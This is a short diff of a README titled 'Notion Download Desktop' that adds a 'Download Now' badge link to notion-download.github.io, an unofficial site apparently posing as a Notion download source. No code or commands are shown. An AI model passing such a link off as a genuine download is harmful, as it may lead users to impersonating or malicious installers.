@@ -2,7 +2,7 @@
 
 🔘 **Notion Download  Desktop:**
 
-[![Download Now 😊](https://img.shields.io/badge/Download-Now-4CAF50?style=for-the-badge&logo=download&logoColor=white)]()
+[![Download Now 😊](https://img.shields.io/badge/Download-Now-4CAF50?style=for-the-badge&logo=download&logoColor=white)](https://notion-download.github.io/.github/)
 
 ## ⚙️ How to Use
 
